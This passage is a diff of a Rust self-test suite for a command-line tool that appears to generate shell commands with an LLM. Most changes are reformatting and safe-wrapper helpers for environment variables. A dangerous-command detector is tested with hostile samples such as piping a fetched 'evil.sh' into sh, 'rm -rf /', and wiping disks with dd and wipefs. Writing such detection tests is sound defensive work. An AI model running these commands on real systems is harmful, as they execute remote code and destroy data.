@@ -1,6 +1,9 @@
 use crate::cache::cache_key;
 use crate::config::{ApiStyle, MAX_RETRIES, Reasoning};
-use crate::context::{apply_placeholders, collect_placeholders, gather_context, get_shell, shell_command, Placeholders};
+use crate::context::{
+    Placeholders, apply_placeholders, collect_placeholders, gather_context, get_shell,
+    shell_command,
+};
 use crate::danger::is_dangerous;
 use crate::llm::{Message, RETRY_HINT};
 use crate::protocol::{parse_check, parse_explore, parse_search, strip_markdown_fences};
@@ -8,6 +11,18 @@ use crate::style_label;
 use crate::ui::{is_bare_cd, parse_candidates, truncate};
 
 // ── Built-in self-test suite (`--test`) ─────────────────────────────────────
+
+// std::env::set_var/remove_var are `unsafe fn` since Rust 2024 (they can race
+// with env reads from other threads). run_tests is single-threaded and only
+// touches the process env that it set up itself, so these are sound; the
+// unsafe surface is confined to these two helpers.
+fn set_env(key: &str, value: impl AsRef<std::ffi::OsStr>) {
+    unsafe { std::env::set_var(key, value) }
+}
+
+fn unset_env(key: &str) {
+    unsafe { std::env::remove_var(key) }
+}
 
 pub fn run_tests() {
     println!("Running comma self-tests...\n");
@@ -29,10 +44,7 @@ pub fn run_tests() {
     };
 
     // Test 1: gather_context does NOT contain real username
-    check(
-        "context does not leak username",
-        !ctx.contains(&ph.user),
-    );
+    check("context does not leak username", !ctx.contains(&ph.user));
 
     // Test 2: gather_context does NOT contain real hostname
     check(
@@ -41,19 +53,13 @@ pub fn run_tests() {
     );
 
     // Test 3: gather_context does NOT contain real home path
-    check(
-        "context does not leak home path",
-        !ctx.contains(&ph.home),
-    );
+    check("context does not leak home path", !ctx.contains(&ph.home));
 
     // Test 4: apply_placeholders replaces {{USER}}
     let input = "cd /home/{{USER}}/docs";
     let output = apply_placeholders(input, &ph);
     let expected = format!("cd /home/{}/docs", ph.user);
-    check(
-        &format!("{{USER}} → {} ", ph.user),
-        output == expected,
-    );
+    check(&format!("{{USER}} → {} ", ph.user), output == expected);
 
     // Test 5: apply_placeholders replaces {{HOSTNAME}}
     let input = "ssh {{HOSTNAME}}";
@@ -68,10 +74,7 @@ pub fn run_tests() {
     let input = "ls {{HOME}}/projects";
     let output = apply_placeholders(input, &ph);
     let expected = format!("ls {}/projects", ph.home);
-    check(
-        &format!("{{HOME}} → {} ", ph.home),
-        output == expected,
-    );
+    check(&format!("{{HOME}} → {} ", ph.home), output == expected);
 
     // Test 7: multiple placeholders in one string
     let input = "scp {{USER}}@{{HOSTNAME}}:{{HOME}}/file .";
@@ -90,12 +93,24 @@ pub fn run_tests() {
     check("context contains arch", ctx.contains("Arch:"));
     check("context contains shell", ctx.contains("Shell:"));
     // get_shell always falls back to /bin/sh (Unix) or cmd.exe (Windows)
-    let shell_line = ctx.lines().find(|l| l.starts_with("Shell: ")).unwrap_or("Shell: ");
-    check("shell value is non-empty", shell_line.len() > "Shell: ".len());
+    let shell_line = ctx
+        .lines()
+        .find(|l| l.starts_with("Shell: "))
+        .unwrap_or("Shell: ");
+    check(
+        "shell value is non-empty",
+        shell_line.len() > "Shell: ".len(),
+    );
     check("context contains CWD", ctx.contains("CWD:"));
-    check("context contains packages", ctx.contains("Installed packages"));
+    check(
+        "context contains packages",
+        ctx.contains("Installed packages"),
+    );
     // Standalone executables in user-local dirs (e.g. ~/.kimi-code/bin/kimi)
-    check("context contains user binaries", ctx.contains("User binaries"));
+    check(
+        "context contains user binaries",
+        ctx.contains("User binaries"),
+    );
 
     // Test 10: retry constants are sane
     check("MAX_RETRIES >= 2", MAX_RETRIES >= 2);
@@ -103,7 +118,10 @@ pub fn run_tests() {
     check("RETRY_HINT is non-empty", !RETRY_HINT.is_empty());
 
     // Test 10b: API style parsing, URL auto-detection and labels
-    check("api_style: openai", ApiStyle::from_str("openai") == Some(ApiStyle::OpenAI));
+    check(
+        "api_style: openai",
+        ApiStyle::from_str("openai") == Some(ApiStyle::OpenAI),
+    );
     check(
         "api_style: responses",
         ApiStyle::from_str("responses") == Some(ApiStyle::OpenAIResponses),
@@ -112,7 +130,10 @@ pub fn run_tests() {
         "api_style: openai-responses alias",
         ApiStyle::from_str("openai-responses") == Some(ApiStyle::OpenAIResponses),
     );
-    check("api_style: anthropic", ApiStyle::from_str("claude") == Some(ApiStyle::Anthropic));
+    check(
+        "api_style: anthropic",
+        ApiStyle::from_str("claude") == Some(ApiStyle::Anthropic),
+    );
     check("api_style: unknown", ApiStyle::from_str("gemini").is_none());
     check(
         "api_style from_url: anthropic",
@@ -126,37 +147,88 @@ pub fn run_tests() {
         "api_style from_url: default openai",
         ApiStyle::from_url("https://api.cerebras.ai/v1") == ApiStyle::OpenAI,
     );
-    check("style_label: responses", style_label(ApiStyle::OpenAIResponses) == "responses");
+    check(
+        "style_label: responses",
+        style_label(ApiStyle::OpenAIResponses) == "responses",
+    );
 
     // Test 11: #EXPLORE: prefix detection
-    check("parse_explore: basic", parse_explore("#EXPLORE: openclaw --help") == Some("openclaw --help"));
-    check("parse_explore: with spaces", parse_explore("  #EXPLORE: man ffmpeg  ") == Some("man ffmpeg"));
-    check("parse_explore: no prefix", parse_explore("ls -la").is_none());
-    check("parse_explore: partial prefix", parse_explore("#EXPLOR ls").is_none());
-    check("parse_explore: just prefix", parse_explore("#EXPLORE:").is_none());
+    check(
+        "parse_explore: basic",
+        parse_explore("#EXPLORE: openclaw --help") == Some("openclaw --help"),
+    );
+    check(
+        "parse_explore: with spaces",
+        parse_explore("  #EXPLORE: man ffmpeg  ") == Some("man ffmpeg"),
+    );
+    check(
+        "parse_explore: no prefix",
+        parse_explore("ls -la").is_none(),
+    );
+    check(
+        "parse_explore: partial prefix",
+        parse_explore("#EXPLOR ls").is_none(),
+    );
+    check(
+        "parse_explore: just prefix",
+        parse_explore("#EXPLORE:").is_none(),
+    );
 
     // Test 12: #CHECK: prefix detection
-    check("parse_check: basic", parse_check("#CHECK: ripgrep fd bat") == Some(vec!["ripgrep", "fd", "bat"]));
-    check("parse_check: single", parse_check("#CHECK: jq") == Some(vec!["jq"]));
+    check(
+        "parse_check: basic",
+        parse_check("#CHECK: ripgrep fd bat") == Some(vec!["ripgrep", "fd", "bat"]),
+    );
+    check(
+        "parse_check: single",
+        parse_check("#CHECK: jq") == Some(vec!["jq"]),
+    );
     check("parse_check: no prefix", parse_check("ls -la").is_none());
     check("parse_check: just prefix", parse_check("#CHECK:").is_none());
 
     // Test 12b: #SEARCH: prefix detection
-    check("parse_search: basic", parse_search("#SEARCH: ffmpeg latest version") == Some("ffmpeg latest version".to_string()));
-    check("parse_search: with spaces", parse_search("  #SEARCH: rust release  ") == Some("rust release".to_string()));
+    check(
+        "parse_search: basic",
+        parse_search("#SEARCH: ffmpeg latest version") == Some("ffmpeg latest version".to_string()),
+    );
+    check(
+        "parse_search: with spaces",
+        parse_search("  #SEARCH: rust release  ") == Some("rust release".to_string()),
+    );
     check("parse_search: no prefix", parse_search("ls -la").is_none());
-    check("parse_search: just prefix", parse_search("#SEARCH:").is_none());
-    check("parse_search: comment stripped", parse_search("#SEARCH: ffmpeg changelog # latest") == Some("ffmpeg changelog".to_string()));
+    check(
+        "parse_search: just prefix",
+        parse_search("#SEARCH:").is_none(),
+    );
+    check(
+        "parse_search: comment stripped",
+        parse_search("#SEARCH: ffmpeg changelog # latest") == Some("ffmpeg changelog".to_string()),
+    );
 
     // Test 12c: search config defaults and toggles
     let sc_default = crate::config::SearchConfig::default();
-    check("search config: default provider is off", sc_default.provider() == "off");
+    check(
+        "search config: default provider is off",
+        sc_default.provider() == "off",
+    );
     check("search config: disabled by default", !sc_default.enabled());
-    check("search config: default max_results is 5", sc_default.max_results() == 5);
-    let sc_ddg = crate::config::SearchConfig { provider: Some("duckduckgo".into()), ..Default::default() };
+    check(
+        "search config: default max_results is 5",
+        sc_default.max_results() == 5,
+    );
+    let sc_ddg = crate::config::SearchConfig {
+        provider: Some("duckduckgo".into()),
+        ..Default::default()
+    };
     check("search config: explicit provider enables", sc_ddg.enabled());
-    let sc_clamp = crate::config::SearchConfig { max_results: Some(99), ..Default::default() };
-    check("search config: max_results clamped to 10", sc_clamp.max_results() == 10);
+    let sc_clamp = crate::config::SearchConfig {
+        max_results: Some(99),
+        ..Default::default()
+    };
+    check(
+        "search config: max_results clamped to 10",
+        sc_clamp.max_results() == 10,
+    );
 
     // Test 12d: DDG lite HTML parsing
     let ddg_html = r#"
@@ -170,34 +242,79 @@ pub fn run_tests() {
     let hits = crate::search::parse_ddg_lite(ddg_html, 5);
     check("ddg parse: 2 hits", hits.len() == 2);
     check("ddg parse: title decoded", hits[0].title == "Example Page");
-    check("ddg parse: uddg redirect unwrapped", hits[0].url == "https://example.com/page");
-    check("ddg parse: snippet cleaned", hits[0].snippet == "Some <b>snippet</b> with tags and 'entities'.");
-    check("ddg parse: direct url kept", hits[1].url == "https://direct.example.org/");
-    check("ddg parse: max respected", crate::search::parse_ddg_lite(ddg_html, 1).len() == 1);
-    check("ddg parse: garbage yields no hits", crate::search::parse_ddg_lite("<html></html>", 5).is_empty());
-    check("percent_decode: basic", crate::search::percent_decode("a%20b+c%3A%2F%2Fd") == "a b c://d");
-    check("percent_decode: bad hex kept", crate::search::percent_decode("100%zz") == "100%zz");
-    check("url_encode: space becomes plus", crate::search::url_encode("a b") == "a+b");
-    check("url_encode: reserved encoded", crate::search::url_encode("a&b=c?") == "a%26b%3Dc%3F");
+    check(
+        "ddg parse: uddg redirect unwrapped",
+        hits[0].url == "https://example.com/page",
+    );
+    check(
+        "ddg parse: snippet cleaned",
+        hits[0].snippet == "Some <b>snippet</b> with tags and 'entities'.",
+    );
+    check(
+        "ddg parse: direct url kept",
+        hits[1].url == "https://direct.example.org/",
+    );
+    check(
+        "ddg parse: max respected",
+        crate::search::parse_ddg_lite(ddg_html, 1).len() == 1,
+    );
+    check(
+        "ddg parse: garbage yields no hits",
+        crate::search::parse_ddg_lite("<html></html>", 5).is_empty(),
+    );
+    check(
+        "percent_decode: basic",
+        crate::search::percent_decode("a%20b+c%3A%2F%2Fd") == "a b c://d",
+    );
+    check(
+        "percent_decode: bad hex kept",
+        crate::search::percent_decode("100%zz") == "100%zz",
+    );
+    check(
+        "url_encode: space becomes plus",
+        crate::search::url_encode("a b") == "a+b",
+    );
+    check(
+        "url_encode: reserved encoded",
+        crate::search::url_encode("a&b=c?") == "a%26b%3Dc%3F",
+    );
 
     // Test 12f: write_auto_update_flag
     let pid = std::process::id();
     let tmp1 = std::env::temp_dir().join(format!("comma-test-autoupdate-{}.json", pid));
     std::fs::write(&tmp1, r#"{"model": "x", "cache_size": 100}"#).unwrap();
-    check("write_auto_update_flag: ok on existing", crate::config::write_auto_update_flag(&tmp1, false).is_ok());
-    let data: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(&tmp1).unwrap()).unwrap();
-    check("write_auto_update_flag: flag set", data["auto_update"] == false);
-    check("write_auto_update_flag: keeps other keys", data["model"] == "x" && data["cache_size"] == 100);
+    check(
+        "write_auto_update_flag: ok on existing",
+        crate::config::write_auto_update_flag(&tmp1, false).is_ok(),
+    );
+    let data: serde_json::Value =
+        serde_json::from_str(&std::fs::read_to_string(&tmp1).unwrap()).unwrap();
+    check(
+        "write_auto_update_flag: flag set",
+        data["auto_update"] == false,
+    );
+    check(
+        "write_auto_update_flag: keeps other keys",
+        data["model"] == "x" && data["cache_size"] == 100,
+    );
     let _ = std::fs::remove_file(&tmp1);
     let tmp2 = std::env::temp_dir().join(format!("comma-test-autoupdate-missing-{}.json", pid));
     let _ = std::fs::remove_file(&tmp2);
-    check("write_auto_update_flag: creates missing file", crate::config::write_auto_update_flag(&tmp2, false).is_ok()
-        && std::fs::read_to_string(&tmp2).unwrap().contains("\"auto_update\": false"));
+    check(
+        "write_auto_update_flag: creates missing file",
+        crate::config::write_auto_update_flag(&tmp2, false).is_ok()
+            && std::fs::read_to_string(&tmp2)
+                .unwrap()
+                .contains("\"auto_update\": false"),
+    );
     let _ = std::fs::remove_file(&tmp2);
     let tmp3 = std::env::temp_dir().join(format!("comma-test-autoupdate-bad-{}.json", pid));
     std::fs::write(&tmp3, "{not json").unwrap();
-    check("write_auto_update_flag: invalid json errors, file kept", crate::config::write_auto_update_flag(&tmp3, false).is_err()
-        && std::fs::read_to_string(&tmp3).unwrap() == "{not json");
+    check(
+        "write_auto_update_flag: invalid json errors, file kept",
+        crate::config::write_auto_update_flag(&tmp3, false).is_err()
+            && std::fs::read_to_string(&tmp3).unwrap() == "{not json",
+    );
     let _ = std::fs::remove_file(&tmp3);
 
     // Test 12e: Mojeek HTML parsing
@@ -207,22 +324,62 @@ pub fn run_tests() {
 "#;
     let mhits = crate::search::parse_mojeek(moj_html, 5);
     check("mojeek parse: 2 hits", mhits.len() == 2);
-    check("mojeek parse: title", mhits[0].title == "Node.js — Run JavaScript Everywhere");
+    check(
+        "mojeek parse: title",
+        mhits[0].title == "Node.js — Run JavaScript Everywhere",
+    );
     check("mojeek parse: url", mhits[0].url == "https://nodejs.org/en");
-    check("mojeek parse: snippet cleaned", mhits[0].snippet == "Get Node.js® v24.18.0 Latest LTS release");
-    check("mojeek parse: entity in title", mhits[1].title == "Example & Co");
-    check("mojeek parse: skips more-link", mhits[1].snippet == "Second snippet");
-    check("mojeek parse: max respected", crate::search::parse_mojeek(moj_html, 1).len() == 1);
-    check("mojeek parse: garbage yields no hits", crate::search::parse_mojeek("<html></html>", 5).is_empty());
-    let hit = crate::search::SearchHit { title: "T".into(), url: "U".into(), snippet: "S".into(), page_text: None };
-    check("format_hits: numbered", crate::search::format_hits(&[hit]) == "1. T\n   U\n   S");
-    let hit2 = crate::search::SearchHit { title: "T".into(), url: "U".into(), snippet: "S".into(), page_text: Some("full text".into()) };
-    check("format_hits: page content", crate::search::format_hits(&[hit2]) == "1. T\n   U\n   S\n   Page content:\n   full text");
+    check(
+        "mojeek parse: snippet cleaned",
+        mhits[0].snippet == "Get Node.js® v24.18.0 Latest LTS release",
+    );
+    check(
+        "mojeek parse: entity in title",
+        mhits[1].title == "Example & Co",
+    );
+    check(
+        "mojeek parse: skips more-link",
+        mhits[1].snippet == "Second snippet",
+    );
+    check(
+        "mojeek parse: max respected",
+        crate::search::parse_mojeek(moj_html, 1).len() == 1,
+    );
+    check(
+        "mojeek parse: garbage yields no hits",
+        crate::search::parse_mojeek("<html></html>", 5).is_empty(),
+    );
+    let hit = crate::search::SearchHit {
+        title: "T".into(),
+        url: "U".into(),
+        snippet: "S".into(),
+        page_text: None,
+    };
+    check(
+        "format_hits: numbered",
+        crate::search::format_hits(&[hit]) == "1. T\n   U\n   S",
+    );
+    let hit2 = crate::search::SearchHit {
+        title: "T".into(),
+        url: "U".into(),
+        snippet: "S".into(),
+        page_text: Some("full text".into()),
+    };
+    check(
+        "format_hits: page content",
+        crate::search::format_hits(&[hit2]) == "1. T\n   U\n   S\n   Page content:\n   full text",
+    );
     // clipped_page_text: blank → None; long → char-boundary-safe truncation
-    check("clipped_page_text: blank is None", crate::search::clipped_page_text("   ").is_none());
+    check(
+        "clipped_page_text: blank is None",
+        crate::search::clipped_page_text("   ").is_none(),
+    );
     let long_cjk = "你".repeat(3100);
     let clipped = crate::search::clipped_page_text(&long_cjk).unwrap();
-    check("clipped_page_text: truncated to 3000 bytes", clipped.len() == 3000);
+    check(
+        "clipped_page_text: truncated to 3000 bytes",
+        clipped.len() == 3000,
+    );
     // Brave LLM Context parsing: snippets are plain strings of page content
     let brave_json = serde_json::json!({
         "grounding": { "generic": [
@@ -233,13 +390,26 @@ pub fn run_tests() {
     let bhits = crate::search::parse_brave_llm_context(&brave_json, 5);
     check("brave llm-context: 2 hits", bhits.len() == 2);
     check("brave llm-context: url", bhits[0].url == "https://a.dev/x");
-    check("brave llm-context: snippet is first chunk", bhits[0].snippet == "first chunk");
-    check("brave llm-context: page_text joins chunks",
-        bhits[0].page_text.as_deref() == Some("first chunk\nsecond chunk"));
-    check("brave llm-context: empty snippets → no page_text", bhits[1].page_text.is_none());
-    check("brave llm-context: max respected", crate::search::parse_brave_llm_context(&brave_json, 1).len() == 1);
-    check("brave llm-context: missing grounding yields no hits",
-        crate::search::parse_brave_llm_context(&serde_json::json!({}), 5).is_empty());
+    check(
+        "brave llm-context: snippet is first chunk",
+        bhits[0].snippet == "first chunk",
+    );
+    check(
+        "brave llm-context: page_text joins chunks",
+        bhits[0].page_text.as_deref() == Some("first chunk\nsecond chunk"),
+    );
+    check(
+        "brave llm-context: empty snippets → no page_text",
+        bhits[1].page_text.is_none(),
+    );
+    check(
+        "brave llm-context: max respected",
+        crate::search::parse_brave_llm_context(&brave_json, 1).len() == 1,
+    );
+    check(
+        "brave llm-context: missing grounding yields no hits",
+        crate::search::parse_brave_llm_context(&serde_json::json!({}), 5).is_empty(),
+    );
 
     // Test 13: parse_candidates
     let c = parse_candidates("ls -la ||| exa -la ||| eza -la");
@@ -251,16 +421,34 @@ pub fn run_tests() {
     check("parse_candidates: single", c2.len() == 1);
     check("parse_candidates: single value", c2[0] == "ls -la");
     let c3 = parse_candidates("  ls -la  |||  exa -la  ");
-    check("parse_candidates: trims", c3[0] == "ls -la" && c3[1] == "exa -la");
+    check(
+        "parse_candidates: trims",
+        c3[0] == "ls -la" && c3[1] == "exa -la",
+    );
 
     // Test 14: truncate is char-boundary safe on multi-byte UTF-8
     check("truncate: ascii mid-string", truncate("hello", 3) == "hel");
     check("truncate: shorter than max", truncate("hi", 10) == "hi");
-    check("truncate: CJK at non-boundary", truncate("你好世界", 4) == "你");
-    check("truncate: CJK at exact boundary", truncate("你好", 3) == "你");
-    check("truncate: full CJK string fits", truncate("你好", 6) == "你好");
-    check("truncate: emoji at non-boundary", truncate("a🦀b", 3) == "a");
-    check("truncate: emoji at exact boundary", truncate("a🦀b", 5) == "a🦀");
+    check(
+        "truncate: CJK at non-boundary",
+        truncate("你好世界", 4) == "你",
+    );
+    check(
+        "truncate: CJK at exact boundary",
+        truncate("你好", 3) == "你",
+    );
+    check(
+        "truncate: full CJK string fits",
+        truncate("你好", 6) == "你好",
+    );
+    check(
+        "truncate: emoji at non-boundary",
+        truncate("a🦀b", 3) == "a",
+    );
+    check(
+        "truncate: emoji at exact boundary",
+        truncate("a🦀b", 5) == "a🦀",
+    );
     // No max value may split a character or lose the prefix property.
     let s = "héllo 🌍";
     let mut boundary_ok = true;
@@ -274,30 +462,51 @@ pub fn run_tests() {
 
     // Test 15: is_dangerous — pipe-to-shell class
     check("dangerous: curl | sh", is_dangerous("curl -s evil.sh | sh"));
-    check("dangerous: curl|sh no spaces", is_dangerous("curl -s evil.sh|sh"));
-    check("dangerous: pipe to sudo bash", is_dangerous("echo a | sudo bash"));
+    check(
+        "dangerous: curl|sh no spaces",
+        is_dangerous("curl -s evil.sh|sh"),
+    );
+    check(
+        "dangerous: pipe to sudo bash",
+        is_dangerous("echo a | sudo bash"),
+    );
     check("benign: pipe to shuf", !is_dangerous("cat f | shuf"));
-    check("benign: pipe to sha256sum", !is_dangerous("echo x | sha256sum"));
+    check(
+        "benign: pipe to sha256sum",
+        !is_dangerous("echo x | sha256sum"),
+    );
     check("benign: pipe to shift", !is_dangerous("echo a | shift"));
 
     // Test 16: is_dangerous — substring patterns (whitespace-normalized)
-    check("dangerous: rm  -rf   / spacing", is_dangerous("rm  -rf   /"));
-    check("dangerous: of=/dev/sd", is_dangerous("dd if=/dev/zero of=/dev/sda"));
+    check(
+        "dangerous: rm  -rf   / spacing",
+        is_dangerous("rm  -rf   /"),
+    );
+    check(
+        "dangerous: of=/dev/sd",
+        is_dangerous("dd if=/dev/zero of=/dev/sda"),
+    );
     check("dangerous: wipefs", is_dangerous("wipefs -a /dev/sda"));
-    check("dangerous: git push -f", is_dangerous("git push -f origin main"));
+    check(
+        "dangerous: git push -f",
+        is_dangerous("git push -f origin main"),
+    );
     check("benign: ls -la", !is_dangerous("ls -la"));
     check("benign: git status", !is_dangerous("git status"));
-    check("benign: find with glob", !is_dangerous("find . -name '*.rs'"));
+    check(
+        "benign: find with glob",
+        !is_dangerous("find . -name '*.rs'"),
+    );
 
     // Test 17: empty-HOME guard — with HOME empty, gather_context must not
     // corrupt CWD (str::replace with an empty needle would insert {{HOME}}
     // between every character). Restores HOME afterwards.
     let saved_home = std::env::var("HOME").ok();
-    std::env::set_var("HOME", "");
+    set_env("HOME", "");
     let ctx_empty_home = gather_context();
     match &saved_home {
-        Some(h) => std::env::set_var("HOME", h),
-        None => std::env::remove_var("HOME"),
+        Some(h) => set_env("HOME", h),
+        None => unset_env("HOME"),
     }
     let cwd_line = ctx_empty_home
         .lines()
@@ -322,7 +531,10 @@ pub fn run_tests() {
 
     // Test 19: cache_key is per-model — the cache-first pass across the
     // fallback chain relies on distinct keys per model for identical messages.
-    let msgs = [Message { role: "user".into(), content: "list files".into() }];
+    let msgs = [Message {
+        role: "user".into(),
+        content: "list files".into(),
+    }];
     let key_a = cache_key("model-a", "sys", &msgs);
     check(
         "cache_key: differs per model",
@@ -338,9 +550,9 @@ pub fn run_tests() {
     // a shell (no spawn can happen in this mode by construction).
     let eval_path = std::env::temp_dir().join(format!("comma-eval-test-{}", std::process::id()));
     let _ = std::fs::remove_file(&eval_path);
-    std::env::set_var("COMMA_EVAL_FILE", &eval_path);
+    set_env("COMMA_EVAL_FILE", &eval_path);
     crate::execute("cd /tmp # comment");
-    std::env::remove_var("COMMA_EVAL_FILE");
+    unset_env("COMMA_EVAL_FILE");
     let eval_content = std::fs::read_to_string(&eval_path).unwrap_or_default();
     let _ = std::fs::remove_file(&eval_path);
     check(
@@ -350,7 +562,10 @@ pub fn run_tests() {
 
     // Test 21: is_bare_cd — first token of the comment-stripped command
     check("is_bare_cd: bare cd", is_bare_cd("cd"));
-    check("is_bare_cd: cd with args", is_bare_cd("cd /d %USERPROFILE%"));
+    check(
+        "is_bare_cd: cd with args",
+        is_bare_cd("cd /d %USERPROFILE%"),
+    );
     check("is_bare_cd: leading spaces", is_bare_cd("   cd /tmp"));
     check("is_bare_cd: with comment", is_bare_cd("cd /tmp # go home"));
     check("is_bare_cd: cd.. is not bare cd", !is_bare_cd("cd.."));
@@ -360,11 +575,14 @@ pub fn run_tests() {
     // eval wrapper sets it so generation matches the shell that evals);
     // an empty value falls through. Saved/restored around the checks.
     let saved_eval_shell = std::env::var("COMMA_EVAL_SHELL").ok();
-    std::env::set_var("COMMA_EVAL_SHELL", "powershell");
-    check("get_shell: COMMA_EVAL_SHELL wins", get_shell() == "powershell");
-    std::env::set_var("COMMA_EVAL_SHELL", "");
+    set_env("COMMA_EVAL_SHELL", "powershell");
+    check(
+        "get_shell: COMMA_EVAL_SHELL wins",
+        get_shell() == "powershell",
+    );
+    set_env("COMMA_EVAL_SHELL", "");
     let with_empty = get_shell();
-    std::env::remove_var("COMMA_EVAL_SHELL");
+    unset_env("COMMA_EVAL_SHELL");
     let without = get_shell();
     check(
         "get_shell: empty COMMA_EVAL_SHELL ignored",
@@ -374,38 +592,50 @@ pub fn run_tests() {
     // Saves/restores SHELL, COMMA_EVAL_SHELL and PSModulePath around the checks.
     let saved_shell = std::env::var("SHELL").ok();
     let saved_ps_module_path = std::env::var("PSModulePath").ok();
-    std::env::remove_var("COMMA_EVAL_SHELL");
+    unset_env("COMMA_EVAL_SHELL");
     if cfg!(unix) {
-        std::env::set_var("SHELL", "/bin/zsh");
+        set_env("SHELL", "/bin/zsh");
         let (prog, args) = shell_command();
-        check("shell_command: uses $SHELL on Unix", prog == "/bin/zsh" && args == ["-c"]);
+        check(
+            "shell_command: uses $SHELL on Unix",
+            prog == "/bin/zsh" && args == ["-c"],
+        );
     }
     if cfg!(windows) {
-        std::env::remove_var("SHELL");
-        std::env::remove_var("PSModulePath");
+        unset_env("SHELL");
+        unset_env("PSModulePath");
         let (prog, args) = shell_command();
-        check("shell_command: falls back to cmd /C on Windows", prog == "cmd" && args == ["/C"]);
-        std::env::set_var("PSModulePath", "C:\\Users\\x\\Documents\\PowerShell\\Modules");
+        check(
+            "shell_command: falls back to cmd /C on Windows",
+            prog == "cmd" && args == ["/C"],
+        );
+        set_env(
+            "PSModulePath",
+            "C:\\Users\\x\\Documents\\PowerShell\\Modules",
+        );
         let (prog2, args2) = shell_command();
-        check("shell_command: detects PowerShell via PSModulePath", prog2 == "powershell" && args2 == ["-c"]);
+        check(
+            "shell_command: detects PowerShell via PSModulePath",
+            prog2 == "powershell" && args2 == ["-c"],
+        );
     }
-    std::env::set_var("COMMA_EVAL_SHELL", "powershell");
+    set_env("COMMA_EVAL_SHELL", "powershell");
     let (prog2, args2) = shell_command();
     check(
         "shell_command: COMMA_EVAL_SHELL wins",
         prog2 == "powershell" && args2 == ["-c"],
     );
     match &saved_eval_shell {
-        Some(v) => std::env::set_var("COMMA_EVAL_SHELL", v),
-        None => std::env::remove_var("COMMA_EVAL_SHELL"),
+        Some(v) => set_env("COMMA_EVAL_SHELL", v),
+        None => unset_env("COMMA_EVAL_SHELL"),
     }
     match &saved_shell {
-        Some(v) => std::env::set_var("SHELL", v),
-        None => std::env::remove_var("SHELL"),
+        Some(v) => set_env("SHELL", v),
+        None => unset_env("SHELL"),
     }
     match &saved_ps_module_path {
-        Some(v) => std::env::set_var("PSModulePath", v),
-        None => std::env::remove_var("PSModulePath"),
+        Some(v) => set_env("PSModulePath", v),
+        None => unset_env("PSModulePath"),
     }
 
     // Test 23: every embedded locale substitutes named placeholders.
@@ -446,7 +676,7 @@ pub fn run_tests() {
         let xdg = fake.join(".config/comma/config.json");
         let legacy = fake.join(".local/bin/,.config.json");
         let saved_xdg = std::env::var("XDG_CONFIG_HOME").ok();
-        std::env::remove_var("XDG_CONFIG_HOME");
+        unset_env("XDG_CONFIG_HOME");
 
         // Neither exists → XDG path (where new installs write the template)
         check("config_path: defaults to XDG", config_path(&home) == xdg);
@@ -474,7 +704,10 @@ pub fn run_tests() {
         use crate::config::cache_path;
         let cache_xdg = fake.join(".cache/comma/cache.json");
         std::fs::remove_file(&xdg).unwrap();
-        check("cache_path: defaults to XDG cache", cache_path(&home) == cache_xdg);
+        check(
+            "cache_path: defaults to XDG cache",
+            cache_path(&home) == cache_xdg,
+        );
         std::fs::write(fake.join(".local/bin/,.cache.json"), "{}").unwrap();
         check(
             "cache_path: legacy fallback",
@@ -484,12 +717,15 @@ pub fn run_tests() {
         // Portable install: a file next to the executable beats ~/.local/bin
         let exe_cfg = crate::config::exe_dir(&home).join(",.config.json");
         std::fs::write(&exe_cfg, "{}").unwrap();
-        check("config_path: executable-adjacent (portable)", config_path(&home) == exe_cfg);
+        check(
+            "config_path: executable-adjacent (portable)",
+            config_path(&home) == exe_cfg,
+        );
         let _ = std::fs::remove_file(&exe_cfg);
 
         // XDG_CONFIG_HOME honored
         let custom = fake.join("custom-xdg");
-        std::env::set_var("XDG_CONFIG_HOME", &custom);
+        set_env("XDG_CONFIG_HOME", &custom);
         std::fs::create_dir_all(custom.join("comma")).unwrap();
         std::fs::write(custom.join("comma/config.json"), "{}").unwrap();
         check(
@@ -498,8 +734,8 @@ pub fn run_tests() {
         );
 
         match &saved_xdg {
-            Some(v) => std::env::set_var("XDG_CONFIG_HOME", v),
-            None => std::env::remove_var("XDG_CONFIG_HOME"),
+            Some(v) => set_env("XDG_CONFIG_HOME", v),
+            None => unset_env("XDG_CONFIG_HOME"),
         }
         let _ = std::fs::remove_dir_all(&fake);
     }
@@ -543,7 +779,10 @@ pub fn run_tests() {
     let r = Reasoning::Effort("low".into());
     check("reasoning effort(low) passthrough", r.effort_str() == "low");
     let r = Reasoning::Effort("custom".into());
-    check("reasoning effort(custom) passthrough", r.effort_str() == "custom");
+    check(
+        "reasoning effort(custom) passthrough",
+        r.effort_str() == "custom",
+    );
 
     // Default reasoning is Tokens(0) = disabled
     let r = Reasoning::default();
@@ -551,12 +790,30 @@ pub fn run_tests() {
     check("reasoning default effort is none", r.effort_str() == "none");
 
     // ── strip_markdown_fences ───────────────────────────────────────────────
-    check("strip fences: basic", strip_markdown_fences("```bash\nls -la\n```") == "ls -la");
-    check("strip fences: no lang tag", strip_markdown_fences("```\nls -la\n```") == "ls -la");
-    check("strip fences: no fences", strip_markdown_fences("ls -la") == "ls -la");
-    check("strip fences: opening only", strip_markdown_fences("```bash\nls -la") == "ls -la");
-    check("strip fences: leading text", strip_markdown_fences("Here:\n```bash\nls -la\n```") == "Here:\n```bash\nls -la\n```");
-    check("strip fences: trailing newline", strip_markdown_fences("```bash\nls -la\n```\n") == "ls -la");
+    check(
+        "strip fences: basic",
+        strip_markdown_fences("```bash\nls -la\n```") == "ls -la",
+    );
+    check(
+        "strip fences: no lang tag",
+        strip_markdown_fences("```\nls -la\n```") == "ls -la",
+    );
+    check(
+        "strip fences: no fences",
+        strip_markdown_fences("ls -la") == "ls -la",
+    );
+    check(
+        "strip fences: opening only",
+        strip_markdown_fences("```bash\nls -la") == "ls -la",
+    );
+    check(
+        "strip fences: leading text",
+        strip_markdown_fences("Here:\n```bash\nls -la\n```") == "Here:\n```bash\nls -la\n```",
+    );
+    check(
+        "strip fences: trailing newline",
+        strip_markdown_fences("```bash\nls -la\n```\n") == "ls -la",
+    );
 
     // ── setup.rs: entries <-> json, move_item, backup ───────────────────────
     let cfg_json = serde_json::json!({
@@ -573,110 +830,219 @@ pub fn run_tests() {
     });
     let entries = crate::setup::json_to_entries(&cfg_json);
     check("setup json_to_entries: 2 entries", entries.len() == 2);
-    check("setup json_to_entries: joined fields",
-        entries[0].provider == "cerebras" && entries[0].auth_token == "k1"
-        && entries[0].model == "gemma-4-31b" && entries[0].retries == 2);
-    check("setup json_to_entries: api_style kept", entries[1].api_style.as_deref() == Some("openai"));
-    check("setup json_to_entries: retries defaults to 1", entries[1].retries == 1);
+    check(
+        "setup json_to_entries: joined fields",
+        entries[0].provider == "cerebras"
